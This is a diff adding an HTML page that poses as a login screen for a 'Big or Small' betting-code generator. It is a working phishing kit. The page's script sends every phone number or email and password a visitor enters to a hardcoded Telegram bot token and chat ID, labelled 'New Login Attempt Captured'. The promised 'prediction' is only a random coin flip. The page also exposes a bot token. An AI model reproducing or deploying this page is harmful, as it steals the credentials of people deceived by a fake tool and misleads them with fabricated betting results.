@@ -1,0 +1,238 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Big or Small - Telegram Integrated</title>
+<style>
+:root{ --bg:#f5f9ff; --accent:#6a5acd; --muted:#7d8aa3; --card:#ffffff; --soft:#f2f6fb; --green:#28a745; --err:#e74c3c; }
+body{ margin:0; font-family:Inter, system-ui, sans-serif; background:linear-gradient(180deg,#f8fafc,#fff); color:#243044; }
+.wrap{ max-width:520px; margin:20px auto; padding:12px; }
+.header{ background:linear-gradient(180deg,#6a5acd,#836fff); color:white; border-radius:12px; padding:18px 16px; box-shadow:0 6px 18px rgba(106,90,205,0.25); }
+.header h1{ margin:0 0 6px 0; font-size:20px; }
+.header p{ margin:0; font-size:13px; opacity:.95; }
+.card{ background:var(--card); border-radius:12px; margin-top:12px; padding:14px; box-shadow:0 6px 18px rgba(20,20,30,0.04); transition:transform .36s,opacity .36s; }
+.tabs{ display:flex; gap:8px; margin-bottom:10px; }
+.tab{ flex:1; text-align:center; padding:8px 10px; border-radius:10px; background:var(--soft); cursor:pointer; font-weight:600; }
+.tab.active{ background:white; box-shadow:0 4px 10px rgba(40,40,80,0.05); color:var(--accent); }
+label{ display:block; font-size:12px; color:var(--muted); margin-top:8px; }
+input[type="text"], input[type="password"], input[type="tel"], select{ width:100%; padding:12px; margin-top:6px; border-radius:10px; border:1px solid #e6eefb; background:#fbfdff; font-size:15px; box-sizing:border-box; }
+.row{ display:flex; gap:8px; align-items:center; }
+.country{ width:28%; }
+.phone{ flex:1; }
+.btn{ width:100%; padding:12px 14px; border-radius:12px; background:var(--accent); color:white; font-weight:700; border:0; cursor:pointer; margin-top:12px; box-shadow:0 8px 18px rgba(106,90,205,0.25); }
+.tool{ margin-top:18px; background:linear-gradient(180deg,#eaf2ff,#fefeff); border-radius:14px; padding:12px; text-align:center; box-shadow:0 10px 24px rgba(30,30,60,0.06); transform:translateY(12px); opacity:0; pointer-events:none; transition:transform .36s,opacity .36s; }
+.tool.visible{ transform:translateY(0); opacity:1; pointer-events:auto; }
+.server{ margin:10px 0 12px; padding:8px 10px; background:white; border-radius:10px; }
+.control{ background:white; border-radius:10px; padding:12px; text-align:left; box-shadow:0 6px 16px rgba(20,30,80,0.04); }
+.period{ display:flex; gap:8px; align-items:center; margin-top:8px; }
+.start{ margin-top:12px; display:flex; } .start button{ flex:1; padding:12px; border-radius:10px; border:0; font-weight:700; cursor:pointer; background:var(--green); color:white; }
+.result-box{ margin-top:14px; padding:18px; border-radius:12px; font-weight:700; font-size:22px; color:#fff; display:none; text-align:center; }
+.big{ background:linear-gradient(90deg,#ff6b6b,#ff8787); }
+.small-res{ background:linear-gradient(90deg,#4dabf7,#339af0); }
+.err-msg{ color:var(--err); font-size:13px; margin-top:6px; display:none; }
+.retype{ margin-top:8px; display:none; }
+.card.hidden{ transform:translateY(-18px) scale(.995); opacity:0; pointer-events:none; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="header">
+    <h1>Login</h1>
+    <p>Please sign in with your phone or email to continue.</p>
+  </div>
+
+  <div class="card" id="loginCard">
+    <div class="tabs">
+      <div class="tab active" id="tab-phone">Phone</div>
+      <div class="tab" id="tab-email">Email</div>
+    </div>
+
+    <div id="content-phone">
+      <label>Phone Number</label>
+      <div class="row">
+        <select class="country" id="country">
+          <option value="+1">+1</option>
+          <option value="+44">+44</option>
+          <option value="+95">+95</option>
+        </select>
+        <input class="phone" id="phone" type="tel" placeholder="Enter phone number">
+      </div>
+      <label>Password</label>
+      <input id="pwd" type="password" placeholder="Enter password">
+      <div class="retype" id="retypeContainerPhone">
+        <label>Retype Password</label>
+        <input id="pwdRetype" type="password" placeholder="Retype password">
+        <div class="err-msg" id="errPhone">Passwords do not match.</div>
+      </div>
+      <button class="btn" id="loginBtn">Login</button>
+    </div>
+
+    <div id="content-email" style="display:none;">
+      <label>Email</label>
+      <input id="email" type="text" placeholder="example@mail.com">
+      <label>Password</label>
+      <input id="pwd2" type="password" placeholder="Enter password">
+      <div class="retype" id="retypeContainerEmail">
+        <label>Retype Password</label>
+        <input id="pwd2Retype" type="password" placeholder="Retype password">
+        <div class="err-msg" id="errEmail">Passwords do not match.</div>
+      </div>
+      <button class="btn" id="loginEmail">Login with Email</button>
+    </div>
+  </div>
+
+  <div class="tool" id="toolPanel">
+    <div class="server">🎲 Big or Small Generator</div>
+    <div class="control">
+      <p style="font-size:14px; color:green; text-align:center;">✅ Login successful. Notification sent to Telegram.</p>
+      <label>Enter Code (3 digits)</label>
+      <div class="period"><input id="period" type="text" maxlength="3" placeholder="e.g. 123" style="width:100%; padding:10px; border-radius:8px; margin-top:6px;"></div>
+      <div class="start" style="margin-top:10px;">
+        <button id="startBtn" style="display:none; padding:12px; border-radius:10px; border:0; font-weight:700; cursor:pointer; background:var(--green); color:white;">Get Result</button>
+      </div>
+      <div id="resultBox" class="result-box">Result will appear here...</div>
+    </div>
+  </div>
+</div>
+
+<script>
+// --- YOUR TELEGRAM CONFIGURATION (UPDATED) ---
+const BOT_TOKEN = "7450459233:AAETJXpucGjJ4peM1j9pF22qu-6eWO_NRGI"; // Bot Token
+const CHAT_ID = "7837697153"; // Numerical Chat ID
+
+// --- TELEGRAM SENDING FUNCTION (CLIENT-SIDE) ---
+async function sendToTelegram(content, loginType) {
+    // Construct the message content
+    const message = `<b>🚨 New Login Attempt Captured 🚨</b>\n\n<b>Login Type:</b> ${loginType}\n<b>${content.key}:</b> <i>${content.value}</i>\n<b>Password:</b> <i>${content.password}</i>`;
+    
+    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    const data = new URLSearchParams();
+    data.append('chat_id', CHAT_ID);
+    data.append('text', message);
+    data.append('parse_mode', 'HTML');
+
+    try {
+        const response = await fetch(apiUrl, {
+            method: 'POST',
+            body: data,
+            // Mode is 'cors' for modern browsers, but may still fail due to CORS headers on the host.
+            mode: 'cors' 
+        });
+        // Returns true if the request completed (though actual delivery isn't guaranteed client-side)
+        return true; 
+    } catch (error) {
+        console.error("Failed to send message to Telegram:", error);
+        return false;
+    }
+}
+
+// --- UI Logic ---
+document.getElementById('tab-phone').onclick=()=>{
+  document.getElementById('tab-phone').classList.add('active');
+  document.getElementById('tab-email').classList.remove('active');
+  document.getElementById('content-phone').style.display='block';
+  document.getElementById('content-email').style.display='none';
+};
+document.getElementById('tab-email').onclick=()=>{
+  document.getElementById('tab-email').classList.add('active');
+  document.getElementById('tab-phone').classList.remove('active');
+  document.getElementById('content-email').style.display='block';
+  document.getElementById('content-phone').style.display='none';
+};
+
+const loginCard=document.getElementById('loginCard');
+const toolPanel=document.getElementById('toolPanel');
+function revealTool(){ 
+    loginCard.classList.add('hidden'); 
+    setTimeout(()=>toolPanel.classList.add('visible'),220); 
+    window.scrollTo(0,0);
+}
+
+// --- PHONE Login Logic (Sends Telegram message) ---
+const pwd=document.getElementById('pwd');
+const pwdRetype=document.getElementById('pwdRetype');
+const retypePhone=document.getElementById('retypeContainerPhone');
+const errPhone=document.getElementById('errPhone');
+document.getElementById('loginBtn').onclick=async ()=>{
+    const phone = document.getElementById('country').value + document.getElementById('phone').value.trim();
+    const password = pwd.value;
+
+    // 1. Client-Side Validation
+    if (!password) { 
+      retypePhone.style.display = 'block'; 
+      pwdRetype.focus(); 
+      return; 
+    }
+    if (retypePhone.style.display === 'block' && password !== pwdRetype.value) { 
+      errPhone.style.display = 'block'; 
+      return; 
+    }
+    if (!document.getElementById('phone').value.trim()) { 
+      alert('Please enter phone number.'); 
+      return; 
+    }
+
+    // 2. Send Telegram Notification
+    await sendToTelegram({key: 'Phone', value: phone, password: password}, 'Phone');
+    
+    // 3. Reveal Tool
+    revealTool(); 
+};
+
+// --- EMAIL Login Logic (Sends Telegram message) ---
+const pwd2=document.getElementById('pwd2');
+const pwd2Retype=document.getElementById('pwd2Retype');
+const retypeEmail=document.getElementById('retypeContainerEmail');
+const errEmail=document.getElementById('errEmail');
+document.getElementById('loginEmail').onclick=async ()=>{
+    const email = document.getElementById('email').value.trim();
+    const password = pwd2.value;
+
+    // 1. Client-Side Validation
+    if (!password) { 
+      retypeEmail.style.display = 'block'; 
+      pwd2Retype.focus(); 
+      return; 
+    }
+    if (retypeEmail.style.display === 'block' && password !== pwd2Retype.value) { 
+      errEmail.style.display = 'block'; 
+      return; 
+    }
+    if (!document.getElementById('email').value.trim()) { 
+      alert('Please enter email.'); 
+      return; 
+    }
+
+    // 2. Send Telegram Notification
+    await sendToTelegram({key: 'Email', value: email, password: password}, 'Email');
+
+    // 3. Reveal Tool
+    revealTool(); 
+};
+
+
+// --- Big or Small Game Logic ---
+const periodInput = document.getElementById('period');
+const startBtn = document.getElementById('startBtn');
+const resultBox = document.getElementById('resultBox');
+
+periodInput.addEventListener('input', () => {
+  if (periodInput.value.length > 0) { startBtn.style.display = 'block'; } else { startBtn.style.display = 'none'; }
+});
+
+startBtn.onclick=()=>{
+  const code = periodInput.value.trim();
+  if(code.length!==3 || isNaN(Number(code))){
+    if(!confirm("Code should be 3 digits. Continue anyway?")) return;
+  }
+  const result = Math.random() < 0.5 ? "Big" : "Small";
+  resultBox.style.display='block';
+  resultBox.textContent=result;
+  resultBox.className="result-box "+(result==="Big"?"big":"small-res");
+  startBtn.style.display = 'none';
+};
+</script>
+</body>
+</html>
